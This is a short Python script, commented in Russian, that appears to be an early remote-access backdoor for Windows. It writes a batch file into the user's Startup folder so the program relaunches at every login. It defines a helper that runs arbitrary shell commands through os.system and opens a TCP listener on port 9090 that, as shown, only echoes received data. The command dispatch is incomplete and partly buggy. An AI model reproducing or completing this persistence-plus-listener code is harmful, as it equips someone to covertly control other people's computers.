import socket
import os
from getpass import getuser
from pyautogui import moveRel
USER_NAME = getuser()  # переменная с именем пользователя

def add_to_startup(file_path=""):
    """
    добавляет приложение в автозагрузку
    :param file_path: какой файл добавить? если оставить пустым, то будет сама программа
    :return: ничего не возвращает
    """
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)



def kursor():
    moveRel(0, 0)

def system_command(command):
    os.system(command)
commands = {
    'kursor': kursor()
}
while True:
    sock = socket.socket()
    sock.bind(('', 9090))
    sock.listen(1)
    conn, addr = sock.accept()
    while True:
        data = conn.recv(1024)
        if not data:
            break
        conn.send(data.upper())

    conn.close()